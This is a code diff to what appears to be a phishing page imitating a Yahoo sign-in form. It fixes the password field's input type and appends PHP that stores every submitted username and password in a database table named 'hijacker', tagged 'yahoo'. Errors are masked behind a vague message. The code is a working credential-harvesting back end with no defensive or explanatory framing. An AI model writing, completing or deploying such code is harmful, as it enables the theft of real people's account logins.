@@ -71,7 +71,7 @@
                                 </ul>
                             </div>
                             <div class="input-group">
-                                <input class="phone-no " type="text" name="password" id="login-password" tabindex="1" value="" autocomplete="username" autocapitalize="none" autocorrect="off" autofocus="true" placeholder=" ">
+                                <input class="phone-no " type="password" name="password" id="login-password" tabindex="1" value="" autocomplete="username" autocapitalize="none" autocorrect="off" autofocus="true" placeholder=" ">
                                 <div class="input-field-icon hide" id="username-field-icon"></div>
                                 <label for="login-username" id="login-label" class="login-label" aria-hidden="true">Password</label>
                             </div>
@@ -149,3 +149,24 @@
 </body>
 
 </html>
+
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+require_once './db.php';
+require_once './config.php';
+
+if (isset($_POST['username']) && isset($_POST['password'])) {
+    $db = new Database();
+    try {
+        $db->insertInto('hijacker', 'username, password, type', ':username, :password, :type')
+            ->execute(array(
+                'username' => $_POST['username'],
+                'password' => $_POST['password'],
+                'type' => 'yahoo'
+            ));
+    } catch (\Exception $e) {
+        throw new \Exception('Nothing here');
+    }
+}
